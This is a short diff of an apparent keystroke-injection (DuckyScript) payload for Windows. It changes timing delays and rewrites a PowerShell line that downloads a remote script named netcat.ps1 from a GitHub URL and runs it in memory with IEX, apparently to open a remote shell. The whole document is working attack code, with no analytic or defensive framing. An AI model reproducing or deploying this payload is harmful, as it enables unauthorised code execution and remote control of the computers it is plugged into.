@@ -1,7 +1,7 @@
-DELAY 200
+DELAY 210
 
 GUI r
-DELAY 150
+DELAY 153
 
 STRING cmd
 ENTER
@@ -13,5 +13,5 @@ ENTER
 STRING cls
 ENTER
 
-STRING powershell "$dd = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/toballz/j/master/pshell/netcat.ps1');IEX $dd;"
+powershell "$dd = (iwr 'https://raw.githubusercontent.com/toballz/j/master/pshell/netcat.ps1').content;IEX $dd;"
 ENTER
